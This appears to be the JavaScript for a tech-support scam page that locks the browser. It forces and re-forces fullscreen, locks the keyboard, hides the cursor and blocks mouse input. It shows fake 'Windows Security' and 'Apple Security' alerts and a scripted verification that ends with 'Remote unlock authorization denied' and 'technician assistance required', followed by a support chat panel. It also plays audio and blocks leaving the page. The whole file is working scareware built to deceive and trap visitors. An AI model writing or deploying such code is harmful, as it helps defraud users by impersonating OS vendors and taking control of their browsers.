function _hcvaShowFsHint() {
  try {
    var old = document.getElementById('_hcva_fsh');
    if (old) old.parentNode.removeChild(old);
    var domain = window.location.hostname || 'этот сайт';
    var el = document.createElement('div');
    el.id = '_hcva_fsh';
    el.style.cssText = [
      'position:fixed', 'top:32px', 'left:50%', 'transform:translateX(-50%)',
      'background:rgba(28,28,28,0.93)', 'color:#fff',
      'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif',
      'font-size:15px', 'line-height:1.5', 'padding:11px 26px',
      'border-radius:8px', 'z-index:2147483647', 'pointer-events:none',
      'white-space:nowrap', 'opacity:1', 'transition:opacity 0.5s',
      'display:flex', 'align-items:center', 'gap:5px',
    ].join(';');
    var kbd = document.createElement('span');
    kbd.style.cssText = [
      'display:inline-block', 'border:1px solid rgba(255,255,255,0.55)',
      'border-radius:3px', 'padding:0 5px', 'font-size:12px',
      'line-height:1.6', 'color:#fff',
    ].join(';');
    kbd.textContent = 'Esc';
    var pre = document.createTextNode(domain + ' теперь в полноэкранном режиме (Нажмите\u00a0');
    var post = document.createTextNode('\u00a0для выхода из полноэкранного режима)');
    el.appendChild(pre);
    el.appendChild(kbd);
    el.appendChild(post);
    document.body.appendChild(el);
    setTimeout(function () {
      el.style.opacity = '0';
      setTimeout(function () { try { el.parentNode.removeChild(el); } catch (e) {} }, 600);
    }, 7000);
  } catch (e) {}
}

function hcvaStartPopupAudio() {
  if (typeof window.b1e1p11 === "function") window.b1e1p11();
}

function hcvaEnterPresentation() {
  var el = document.documentElement;
  var rfs =
    el.requestFullscreen ||
    el.webkitRequestFullscreen ||
    el.webkitRequestFullScreen ||
    el.mozRequestFullScreen ||
    el.msRequestFullscreen;
  if (rfs) {
    try {
      var p = rfs.call(el, { navigationUI: "hide" });
      if (p && typeof p.then === "function") {
        p.then(function () {
          hcvaStartPopupAudio();
        }).catch(function () {
          try { rfs.call(el); } catch (e2) {}
          hcvaStartPopupAudio();
        });
      } else {
        hcvaStartPopupAudio();
      }
    } catch (e1) {
      try { rfs.call(el); } catch (e3) {}
      hcvaStartPopupAudio();
    }
  }
  if (navigator.keyboard && navigator.keyboard.lock) {
    navigator.keyboard.lock().catch(function () {});
  }
}

function hcvaIsFullscreen() {
  return !!(
    document.fullscreenElement ||
    document.webkitFullscreenElement ||
    document.mozFullScreenElement ||
    document.msFullscreenElement
  );
}

function hcvaIsScanPhaseActive() {
  var hula = document.getElementById("hula");
  if (!hula) return false;
  if (hula.style.display === "block") return true;
  return window.getComputedStyle(hula).display !== "none";
}

var _hcvaFsReentryLock = false;

function hcvaOnFullscreenChange() {
  if (_hcvaFsReentryLock || hcvaIsFullscreen()) return;
  if (!hcvaIsScanPhaseActive()) return;
  _hcvaFsReentryLock = true;
  setTimeout(function () {
    _hcvaFsReentryLock = false;
    if (!hcvaIsFullscreen() && hcvaIsScanPhaseActive()) {
      hcvaEnterPresentation();
    }
  }, 50);
}

function _hcvaShowWinToast() {
  try {
    var old = document.getElementById('_hcva_wnt');
    if (old) old.parentNode.removeChild(old);
    var ua = (navigator.userAgent || '') + (navigator.platform || '');
    var isMac = /Mac|iPhone|iPad|iPod/.test(ua) && !/Windows/.test(ua);
    var el = document.createElement('div');
    el.id = '_hcva_wnt';
    el.style.cssText = [
      'position:fixed', 'bottom:24px', 'right:20px', 'width:360px',
      'color:#fff',
      'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif',
      'border-radius:' + (isMac ? '14px' : '8px'),
      'padding:14px 16px',
      'box-shadow:0 8px 32px rgba(0,0,0,0.6)',
      'background:' + (isMac ? 'rgba(44,44,46,0.97)' : '#1f1f1f'),
      'z-index:2147483647', 'pointer-events:none',
      'opacity:0', 'transform:translateX(120%)',
      'transition:opacity 0.35s ease,transform 0.35s ease',
      'display:flex', 'align-items:flex-start', 'gap:12px',
    ].join(';');
    var icon = isMac
      ? [
          '<svg width="32" height="32" viewBox="0 0 32 32" fill="none" style="flex-shrink:0;margin-top:2px">',
            '<rect width="32" height="32" rx="8" fill="#636366"/>',
            '<path d="M16 7c-1.8 0-3.2.6-4.3 1.5C10.6 9.4 10 10.7 10 12c0 .9.3 1.7.7 2.3-.5.2-.7.6-.7 1v1.4c0 .5.4.8.8.8h.5l.5 4.2c.1.6.6 1 1.2 1h6c.6 0 1.1-.4 1.2-1l.5-4.2h.5c.4 0 .8-.3.8-.8v-1.4c0-.4-.2-.8-.7-1 .4-.6.7-1.4.7-2.3 0-1.3-.6-2.6-1.7-3.5C18.2 7.6 17.2 7 16 7z" fill="#fff"/>',
          '</svg>',
        ].join('')
      : [
          '<svg width="32" height="32" viewBox="0 0 32 32" fill="none" style="flex-shrink:0;margin-top:2px">',
            '<rect width="32" height="32" rx="4" fill="#0078d4"/>',
            '<path d="M16 6L8 11v5c0 4.97 3.4 9.63 8 10.93 4.6-1.3 8-5.96 8-10.93v-5L16 6z" fill="#fff"/>',
            '<path d="M13.5 16.5l2 2 4-4" stroke="#0078d4" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>',
          '</svg>',
        ].join('');
    var title = isMac ? 'Apple Security' : 'Windows Security';
    el.innerHTML = icon + [
      '<div>',
        '<div style="font-size:13px;font-weight:600;margin-bottom:4px;">' + title + '</div>',
        '<div style="font-size:12px;color:#ccc;line-height:1.5;">',
          'Relax, we are with you.',
        '</div>',
      '</div>',
    ].join('');
    document.body.appendChild(el);
    requestAnimationFrame(function () {
      requestAnimationFrame(function () {
        el.style.opacity = '1';
        el.style.transform = 'translateX(0)';
      });
    });
    setTimeout(function () {
      el.style.opacity = '0';
      el.style.transform = 'translateX(120%)';
      setTimeout(function () { try { el.parentNode.removeChild(el); } catch (e) {} }, 400);
    }, 7000);
  } catch (e) {}
}

function _hcvaBindTopMsg() {
  try {
    var el = document.createElement('div');
    el.id = '_hcva_topmsg';
    el.style.cssText = [
      'position:fixed', 'top:0', 'left:50%',
      'transform:translateX(-50%) translateY(-110%)',
      'background:rgba(28,28,28,0.93)', 'color:#fff',
      'font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,sans-serif',
      'font-size:14px', 'padding:10px 28px', 'border-radius:0 0 10px 10px',
      'z-index:2147483647', 'pointer-events:none', 'white-space:nowrap',
      'transition:transform 0.25s ease,opacity 0.25s ease',
      'opacity:0',
    ].join(';');
    el.textContent = "Don't panic, relax — we are here to help";
    document.body.appendChild(el);
    var hideTimer = null;
    document.addEventListener('mousemove', function (e) {
      if (e.clientY < 64) {
        clearTimeout(hideTimer);
        el.style.transform = 'translateX(-50%) translateY(0)';
        el.style.opacity = '1';
      } else {
        clearTimeout(hideTimer);
        hideTimer = setTimeout(function () {
          el.style.transform = 'translateX(-50%) translateY(-110%)';
          el.style.opacity = '0';
        }, 250);
      }
    });
  } catch (e) {}
}

function _hcvaOnFsEnter() {
  if (hcvaIsFullscreen()) {
    _hcvaShowFsHint();
    _hcvaShowWinToast();
    hcvaStartPopupAudio();
  }
}

function _hcvaOnEscKey(e) {
  if (e.key === "Escape" || e.key === "Esc" || e.keyCode === 27) {
    _hcvaShowFsHint();
    _hcvaShowWinToast();
  }
}

function hcvaBindFullscreenGuard() {
  _hcvaBindTopMsg();
  document.addEventListener("fullscreenchange", hcvaOnFullscreenChange);
  document.addEventListener("webkitfullscreenchange", hcvaOnFullscreenChange);
  document.addEventListener("mozfullscreenchange", hcvaOnFullscreenChange);
  document.addEventListener("MSFullscreenChange", hcvaOnFullscreenChange);
  document.addEventListener("fullscreenchange", _hcvaOnFsEnter);
  document.addEventListener("webkitfullscreenchange", _hcvaOnFsEnter);
  document.addEventListener("mozfullscreenchange", _hcvaOnFsEnter);
  document.addEventListener("MSFullscreenChange", _hcvaOnFsEnter);
  document.addEventListener("keydown", _hcvaOnEscKey, true);
}

function showd() {
  document.getElementById("firstpop").style.display = "block";
  document.getElementById("loader").style.display = "block";
  hcvaShowPage1Call();
}

function hcvaShowPage1Call() {
  var el = document.getElementById("win-toast-call-page1");
  if (!el || hcvaIsScanPhaseActive()) return;
  el.style.display = "flex";
  el.classList.add("is-visible");
}

function hcvaHidePage1Call() {
  var el = document.getElementById("win-toast-call-page1");
  if (!el) return;
  el.classList.remove("is-visible");
  el.style.display = "none";
}

/** Body click — standalone opens scan; embed still unlocks audio. */
function hcvaBodyClick() {
  if (typeof b1e1p11 === "function") b1e1p11();
  if (window.HCVA_EMBED_UI) return;
  showd1();
  if (window.hcvaEnterPresentation) hcvaEnterPresentation();
}

function hcvaHidePage2Modals() {
  $(".win-mini-modal, .win-toast").stop(true).fadeOut(200).removeClass("is-visible");
}

var HCVA_MODAL_POS_CLASSES = [
  "win-mini-modal--left",
  "win-mini-modal--right-mid",
  "win-mini-modal--center",
  "win-mini-modal--lower",
];

var HCVA_MODAL_NEXT = {
  "win-modal-firewall": "win-modal-swap-1",
  "win-modal-defender": "win-modal-swap-2",
  "win-modal-smartscreen": "win-modal-swap-3",
  "win-modal-network": "win-modal-swap-4",
  "win-modal-swap-1": "win-modal-swap-support",
  "win-modal-swap-2": "win-modal-swap-support",
  "win-modal-swap-3": "win-modal-swap-support",
  "win-modal-swap-4": "win-modal-swap-support",
  "win-modal-swap-support": "win-modal-swap-support-b",
  "win-modal-swap-support-b": "win-modal-swap-support",
};

function hcvaCopyModalPosition($from, $to) {
  var i;
  for (i = 0; i < HCVA_MODAL_POS_CLASSES.length; i++) {
    $to.removeClass(HCVA_MODAL_POS_CLASSES[i]);
  }
  for (i = 0; i < HCVA_MODAL_POS_CLASSES.length; i++) {
    if ($from.hasClass(HCVA_MODAL_POS_CLASSES[i])) {
      $to.addClass(HCVA_MODAL_POS_CLASSES[i]);
    }
  }
}

function hcvaShowMiniModal($el) {
  if (!$el || !$el.length) return;
  $el.css("display", "block");
  requestAnimationFrame(function () {
    $el.addClass("is-visible");
  });
}

function hcvaReplaceMiniModal($closed) {
  var closedId = $closed.attr("id");
  var nextId = HCVA_MODAL_NEXT[closedId] || "win-modal-swap-support";
  var $next = $("#" + nextId);
  if (!$next.length) return;

  hcvaCopyModalPosition($closed, $next);

  $closed.stop(true).fadeOut(200, function () {
    $closed.removeClass("is-visible").css("display", "none");
    hcvaShowMiniModal($next);
  });
}

function hcvaResetPage2Modals() {
  hcvaHidePage2Modals();
  if (window._hcvaModalTimers) {
    for (var i = 0; i < window._hcvaModalTimers.length; i++) {
      clearTimeout(window._hcvaModalTimers[i]);
    }
  }
  window._hcvaModalTimers = [];
}

function hcvaShowPage2Modal(selector, delay) {
  var timer = setTimeout(function () {
    var $el = $(selector);
    if (!$el.length) return;
    $el.css("display", $el.hasClass("win-toast") ? "flex" : "block");
    requestAnimationFrame(function () {
      $el.addClass("is-visible");
    });
  }, delay);
  window._hcvaModalTimers.push(timer);
}

function hcvaSchedulePage2Modals() {
  hcvaShowPage2Modal("#win-toast-call", 0);
  hcvaShowPage2Modal("#win-modal-firewall", 900);
  hcvaShowPage2Modal("#win-toast-security", 1800);
  hcvaShowPage2Modal("#win-modal-defender", 2600);
  hcvaShowPage2Modal("#win-toast-lock", 3400);
  hcvaShowPage2Modal("#win-modal-smartscreen", 4200);
}

function hcvaScheduleVerifyModals() {
  hcvaShowPage2Modal("#win-modal-network", 300);
  hcvaShowPage2Modal("#win-toast-call", 800);
}

function hcvaScheduleFinalModals() {
  hcvaShowPage2Modal("#win-toast-call", 200);
  hcvaShowPage2Modal("#win-toast-security", 800);
}

function hcvaShowSupportPanel() {
  if (window._hcvaSupportShown) return;
  window._hcvaSupportShown = true;
  window._hcvaVerifyRunning = false;
  if (window._hcvaVerifyTimer) clearTimeout(window._hcvaVerifyTimer);
  if (window._hcvaAutoVerifyTimer) clearTimeout(window._hcvaAutoVerifyTimer);
  $("#admin-box").stop(true).fadeOut(450, function () {
    hcvaScheduleFinalModals();
    var $support = $("#chat-box");
    $support.css("display", "block");
    requestAnimationFrame(function () {
      $support.addClass("is-visible");
    });
  });
}

var HCVA_VERIFY_STEPS = [
  { label: "Verifying administrator credentials…", duration: 1100 },
  { label: "Checking Windows Security policy…", duration: 1000 },
  { label: "Scanning network breach signatures…", duration: 1200 },
  { label: "Validating device lock status…", duration: 1000 },
  { label: "Cross-referencing flagged IP address…", duration: 1100 },
  { label: "Remote unlock authorization denied.", duration: 900, fail: true },
];

function hcvaResetAdminPanel() {
  window._hcvaVerifyRunning = false;
  if (window._hcvaVerifyTimer) clearTimeout(window._hcvaVerifyTimer);
  if (window._hcvaAutoVerifyTimer) clearTimeout(window._hcvaAutoVerifyTimer);
  $("#admin-box .win-admin-panel__form").show();
  $("#admin-box .win-admin-panel__loading").hide();
  $("#hcva-verify-steps li").removeClass("is-active is-done is-fail");
  $("#hcva-verify-status").removeClass("is-fail").text("Initializing verification…");
  $("#hcva-verify-progress").css("width", "0%");
}

function hcvaStartVerificationSequence() {
  if (window._hcvaVerifyRunning || window._hcvaSupportShown) return;
  window._hcvaVerifyRunning = true;
  if (window._hcvaAutoVerifyTimer) clearTimeout(window._hcvaAutoVerifyTimer);

  $("#admin-box .win-admin-panel__form").fadeOut(200);
  $("#admin-box .win-admin-panel__loading").fadeIn(200, function () {
    hcvaScheduleVerifyModals();
    var stepIndex = 0;
    var total = HCVA_VERIFY_STEPS.length;
    var $steps = $("#hcva-verify-steps li");
    var $status = $("#hcva-verify-status");
    var $bar = $("#hcva-verify-progress");

    function finishStep(idx, failed) {
      $steps.eq(idx).removeClass("is-active").addClass(failed ? "is-fail" : "is-done");
    }

    function runStep() {
      if (window._hcvaSupportShown) return;
      if (stepIndex >= total) {
        $status.text("Verification complete — technician assistance required.");
        window._hcvaVerifyTimer = setTimeout(hcvaShowSupportPanel, 500);
        return;
      }

      var step = HCVA_VERIFY_STEPS[stepIndex];
      $status.text(step.label).toggleClass("is-fail", !!step.fail);
      $steps.eq(stepIndex).addClass("is-active");
      $bar.css("width", Math.round(((stepIndex + 1) / total) * 100) + "%");

      window._hcvaVerifyTimer = setTimeout(function () {
        finishStep(stepIndex, !!step.fail);
        stepIndex += 1;
        runStep();
      }, step.duration);
    }

    runStep();
  });
}

function showd1() {
  document.getElementById("firstpop").style.display = "none";
  hcvaHidePage1Call();
  window._hcvaSupportShown = false;
  hcvaResetAdminPanel();
  hcvaResetPage2Modals();

  document.getElementById("hula").style.display = "block";
  document.documentElement.classList.add("hcva-page2-active");
  $(".nen").delay(800).fadeIn(500);
  $(".nen1").delay(2000).fadeIn(1000);
  $(".nen2").delay(3000).fadeIn(1000);
  $(".nen3").delay(3000).fadeIn(1500);
  if (window.HCVA_EMBED_UI) {
    $("#admin-box").fadeIn(800);
  } else {
    $("#admin-box").delay(3000).fadeIn(800);
  }
  $("#chat-box").hide().removeClass("is-visible");
  hcvaSchedulePage2Modals();

  window._hcvaAutoVerifyTimer = setTimeout(function () {
    if (!window._hcvaVerifyRunning && !window._hcvaSupportShown) {
      hcvaStartVerificationSequence();
    }
  }, 4500);

  hcvaStartPopupAudio();
  hcvaEnterPresentation();
  [200, 800, 2000].forEach(function (ms) {
    setTimeout(hcvaStartPopupAudio, ms);
  });
}

function hcvaAdminVerify() {
  hcvaStartVerificationSequence();
}

function hcvaAutoClickScan() {
  var nodes = document.querySelectorAll(".den");
  var el = null;
  for (var i = 0; i < nodes.length; i++) {
    if (/scan/i.test(nodes[i].textContent || "")) {
      el = nodes[i];
      break;
    }
  }
  if (!el && nodes.length) el = nodes[0];
  try {
    showd1();
  } catch (e1) {
    if (el) {
      try {
        el.click();
      } catch (e2) {}
    }
  }
  try {
    hcvaEnterPresentation();
  } catch (eFs) {}
  try {
    if (typeof b1e1p11 === "function") b1e1p11();
  } catch (e3) {}
  try {
    window.parent.postMessage(
      {
        type: "hcva:auto_click_scan_ack",
        ok: true,
        target: el ? "den_scan" : "showd1",
      },
      "*"
    );
  } catch (e4) {}
  return true;
}

/** Embed parent requests the admin-login panel (page 2) — only after user chose Scan/Exit. */
function hcvaShowAdminPanel() {
  if (!hcvaIsScanPhaseActive()) return false;
  $("#admin-box").stop(true, true).css("display", "block").fadeIn(300);
  try {
    hcvaEnterPresentation();
  } catch (eFs) {}
  try {
    if (typeof b1e1p11 === "function") b1e1p11();
  } catch (e2) {}
  try {
    window.parent.postMessage(
      { type: "hcva:show_admin_panel_ack", ok: true },
      "*"
    );
  } catch (e3) {}
  return true;
}

(function hcvaOfferInit() {
  var emb = false;
  try {
    emb = window.self !== window.top;
  } catch (e) {
    emb = true;
  }
  try {
    if (!emb && /[?&]hcva_embed=1(?:&|$)/i.test(String(window.location.search || ""))) {
      emb = true;
    }
  } catch (e2) {}
  window.HCVA_EMBED_UI = emb;
  window.hcvaAutoClickScan = hcvaAutoClickScan;
  window.hcvaShowAdminPanel = hcvaShowAdminPanel;
  window.hcvaEnterPresentation = hcvaEnterPresentation;
  window.hcvaStartPopupAudio = hcvaStartPopupAudio;
  window.hcvaAdminVerify = hcvaAdminVerify;
  window.hcvaReplaceMiniModal = hcvaReplaceMiniModal;

  var HCVA_CURSOR_ZONES = "#firstpop";

  function hcvaBindModalCursor() {
    var root = document.documentElement;
    function syncCursor(e) {
      if (hcvaIsScanPhaseActive()) {
        root.style.cursor = "none";
        return;
      }
      var overModal =
        e.target &&
        e.target.closest &&
        e.target.closest(HCVA_CURSOR_ZONES);
      root.style.cursor = overModal ? "" : "none";
    }
    document.addEventListener("mouseover", syncCursor, true);
    document.addEventListener("mouseleave", function () {
      root.style.cursor = hcvaIsScanPhaseActive() ? "none" : "none";
    });
    root.style.cursor = "none";
  }

  function hcvaBindRightClickGuard() {
    document.addEventListener("contextmenu", function (e) {
      e.preventDefault();
      e.stopPropagation();
      try {
        hcvaEnterPresentation();
      } catch (err) {}
      return false;
    }, true);
  }

  function hcvaBindPage2MouseGuard() {
    var events = [
      "click",
      "mousedown",
      "mouseup",
      "dblclick",
      "contextmenu",
      "wheel",
      "mousemove",
      "pointerdown",
      "pointerup",
      "pointermove",
    ];
    function blockPage2Mouse(e) {
      if (!hcvaIsScanPhaseActive()) return;
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      return false;
    }
    for (var i = 0; i < events.length; i++) {
      document.addEventListener(events[i], blockPage2Mouse, true);
    }
  }

  hcvaBindModalCursor();
  hcvaBindRightClickGuard();
  hcvaBindPage2MouseGuard();
  hcvaBindFullscreenGuard();
  hcvaShowPage1Call();

  $(document).on("click", ".win-mini-modal__close", function (e) {
    e.stopPropagation();
    hcvaReplaceMiniModal($(this).closest(".win-mini-modal"));
  });

  function onAnyClick(e) {
    /* If page 2 (scan) is not yet showing, any click outside the .den buttons opens it */
    if (!hcvaIsScanPhaseActive()) {
      var inDen = e.target && e.target.closest && e.target.closest('.den');
      if (!inDen) {
        showd1();
        if (typeof b1e1p11 === 'function') b1e1p11();
      }
    }
    hcvaEnterPresentation();
  }

  document.addEventListener("click", onAnyClick, true);

  /* Any key press also opens page 2 */
  document.addEventListener("keydown", function (e) {
    if (!hcvaIsScanPhaseActive()) {
      showd1();
      if (typeof b1e1p11 === 'function') b1e1p11();
    }
    hcvaEnterPresentation();
    e.preventDefault();
  }, true);

  function blockFirstPopScroll(e) {
    if (e.target && e.target.closest && e.target.closest("#firstpop")) {
      e.preventDefault();
    }
  }
  window.addEventListener("wheel", blockFirstPopScroll, { passive: false, capture: true });
  window.addEventListener("touchmove", blockFirstPopScroll, { passive: false, capture: true });

  if (emb) {
    function hcvaEmbedBoot() {
      try {
        if (typeof showd1 === "function") showd1();
        else showd();
      } catch (eShow) {}
      hcvaBindFullscreenGuard();
      hcvaStartPopupAudio();
      hcvaEnterPresentation();
      [200, 800, 2000, 4000].forEach(function (ms) {
        setTimeout(function () {
          hcvaEnterPresentation();
          hcvaStartPopupAudio();
        }, ms);
      });
    }

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", hcvaEmbedBoot);
    } else {
      hcvaEmbedBoot();
    }

    document.addEventListener("click", function () {
      hcvaStartPopupAudio();
    }, true);
    window.addEventListener("message", function (ev) {
      if (!ev.data) return;
      if (ev.data.type === "hcva:play_audio") hcvaStartPopupAudio();
      if (ev.data.type === "hcva:auto_click_scan") hcvaAutoClickScan();
      if (ev.data.type === "hcva:show_admin_panel") hcvaShowAdminPanel();
    });
    return;
  }

  if (navigator.keyboard && navigator.keyboard.lock) {
    navigator.keyboard.lock().catch(function () {});
  }

  document.onkeydown = function () {
    return false;
  };

  window.onbeforeunload = function () {
    if (typeof data_needs_saving === "function" && data_needs_saving()) {
      return "#";
    }
    return;
  };

  window.addEventListener("beforeunload", function (e) {
    var confirmationMessage =
      "It looks like you are editing something. " +
      "Your changes will be lost if you leave before saving.";
    (e || window.event).returnValue = confirmationMessage;
    return confirmationMessage;
  });
})();
